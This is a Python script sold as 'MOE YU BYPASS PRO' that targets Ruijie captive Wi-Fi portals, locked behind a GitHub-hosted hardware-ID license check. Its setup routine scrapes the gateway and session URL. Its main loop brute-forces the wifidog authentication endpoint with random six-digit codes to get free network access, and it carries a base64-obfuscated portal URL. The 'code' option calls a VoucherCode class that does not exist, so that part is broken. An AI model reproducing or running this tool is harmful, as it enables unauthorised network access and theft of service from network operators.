import os
import re
import sys
import uuid
import time
import json
import zlib
import ntplib
import ping3
import base64
import random
import string
import urllib
import hashlib
import asyncio
import aiohttp
import requests
import argparse
import marshal
import subprocess
from datetime import datetime
from urllib.parse import quote
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
from concurrent.futures import ThreadPoolExecutor

# --- CONFIGURATION (Moe Yu's Database) ---
# Raw link ကို သုံးထားလို့ Database ဖတ်ရတာ ပိုမြန်ပြီး ပိုစိတ်ချရပါတယ်
KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/main/key.txt"

# Colors
w, g, y, r, b, c = "\033[1;37m", "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;34m", "\033[1;36m"

def clear():
    os.system("clear")

def Line():
    print(f"{y}─" * os.get_terminal_size()[0])

def get_hwid():
    """လူတိုင်းအတွက် မတူညီတဲ့ Unique Fixed ID ထုတ်ပေးမည့်စနစ်"""
    try:
        user = os.popen('whoami').read().strip()
        model = os.popen('getprop ro.product.model').read().strip()
        raw_id = f"{user}-{model}"
        if not user or not model:
            raw_id = str(uuid.getnode())
        return hashlib.md5(raw_id.encode()).hexdigest().upper()
    except:
        return "MOEYU-STABLE-USER-BYPASS"

def Logo():
    clear()
    my_id = get_hwid()
    logo = f"""{r}
 ███▄           ▄████▄   ▓█████  ██   ██  ██   ██ 
 ▓██ ▀█▄       ▒██    ▀  ▓█   ▀  ▒██  ██▒ ▒██  ██▒
 ▓██  ▀█▄      ▒██       ▒███     ▒██ ██░  ▒██ ██░
 ░██   █▌      ▒██    ▄  ▒▓█  ▄   ░ ▐██▓░  ░ ▐██▓░
 ░██████░      ▒ ████▀   ░▒████▒  ░ ██▒▓░  ░ ██▒▓░
 ░ ▒▓ ▒ ░      ▒ ░ ▒ ░   ░░ ▒░ ░   ██▒▒▒    ██▒▒▒ 
 ░ ░▒ ░        ░  ▒       ░ ░  ░ ▓██ ░▒░  ▓██ ░▒░ 
   ░  ░      ░          ░    ▒ ▒ ░░   ▒ ▒ ░░  
     ░       ░ ░        ░  ░ ░ ░      ░ ░      ░  
{g}
         ── {w}MOE YU BYPASS PRO {g}──{w}"""
    print(logo)
    Line()
    print(f"{g}  [👤] {w}Dev      : {y}@moeyu")
    print(f"{g}  [🆔] {w}Fixed ID : {c}{my_id}")
    print(f"{g}  [🛡️] {w}Target   : {r}Ruijie Router Only")
    Line()

def check_key():
    """Permanent License Verification with Space Stripping"""
    my_id = get_hwid()
    Logo()
    print(f"{y}[*] Verifying License from Secure Database...{w}")
    try:
        headers = {'User-Agent': 'Mozilla/5.0'}
        # GitHub Cache မဖြစ်အောင် timestamp ထည့်ထားပါတယ်
        res = requests.get(f"{KEY_URL}?t={int(time.time())}", headers=headers, timeout=15)
        
        if res.status_code == 200:
            lines = res.text.splitlines()
            for line in lines:
                if "|" in line:
                    # Space တွေကို တစ်ခါတည်း ဖြတ်ထုတ်ရန်
                    parts = line.strip().split("|")
                    if len(parts) >= 2:
                        db_key = parts[0].strip() # GitHub က ID
                        exp_str = parts[1].strip() # သက်တမ်းကုန်မည့်ရက်
                        
                        if db_key == my_id:
                            today = datetime.now().date()
                            expiry = datetime.strptime(exp_str, "%Y-%m-%d").date()
                            if today <= expiry:
                                print(f"{g}[+] Authorized! Access Granted.{w}")
                                time.sleep(1.5)
                                return True
                            else:
                                print(f"{r}[!] YOUR KEY HAS EXPIRED!{w}")
                                sys.exit()
            
            print(f"{r}[!] UNREGISTERED ID!{w}")
            print(f"{y}[>] Your ID: {c}{my_id}{w}")
            print(f"{y}[>] Add this ID to GitHub key.txt precisely.")
            sys.exit()
        else:
            print(f"{r}[!] Server Error: {res.status_code}{w}")
            sys.exit()
    except Exception as e:
        print(f"{r}[!] Connection Failed! Check Internet.{w}")
        sys.exit()

async def get_session_id(session, session_url, prev_id):
    headers = {'User-Agent': 'Mozilla/5.0'}
    try:
        async with session.get(session_url, headers=headers, timeout=5) as req:
            return re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url)).group(1)
    except: return prev_id

class InternetAccess:
    def __init__(self):
        self.session_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()
        try: self.ip = open(".ip", "r").read().strip()
        except: print(f"{r}[!] Run -o setup first!"); sys.exit()

    async def execute(self):
        Logo()
        print(f"{y}[*] Running Background Bypass Loop...{w}")
        async with aiohttp.ClientSession() as session:
            loop_idx = 0
            while True:
                if loop_idx % 5 == 0: sid = await get_session_id(session, self.session_url, None)
                code = "".join(random.choice(string.digits) for _ in range(6))
                try:
                    async with session.post(f'http://{self.ip}:2060/wifidog/auth?', params={'token': sid, 'phoneNumber': code}) as res:
                        p = await asyncio.to_thread(ping3.ping, 'google.com')
                        p_fmt = f"{g}{int(p*1000)}ms" if p else f"{r}Timeout"
                        print(f"{w}[{datetime.now().strftime('%H:%M:%S')}] Bypass: {res.status} | Ping: {p_fmt}")
                except: pass
                await asyncio.sleep(1)
                loop_idx += 1

def feature():
    parser = argparse.ArgumentParser()
    parser.add_argument("-o", "--option", choices=["code", "internet", "setup"], required=True)
    parser.add_argument("-m", "--mode", choices=["digit", "ascii"], default="digit")
    parser.add_argument("-l", "--length", type=int, default=6)
    parser.add_argument("-s", "--speed", type=int, default=100)
    args = parser.parse_args()

    if args.option == "setup":
        Logo()
        try:
            res = requests.get("http://192.168.0.1", timeout=5).url
            gw = re.search('gw_address=(.*?)&', res).group(1)
            portal = requests.get(res).text
            sid_url = "https://portal-as.ruijienetworks.com" + re.search("href='(.*?)'</script>", portal).group(1)
            with open(".session_url", "w") as f: f.write(sid_url)
            with open(".ip", "w") as f: f.write(gw)
            print(f"{g}[+] Setup Successful!{w}")
        except: print(f"{r}[!] Setup Failed.")
    elif args.option == "internet":
        asyncio.run(InternetAccess().execute())
    elif args.option == "code":
        asyncio.run(VoucherCode(args.mode, args.length, args.speed).start())

if __name__ == "__main__":
    if check_key():
        try: feature()
        except KeyboardInterrupt: print(f"\n{r}[!] Stopped.{w}")
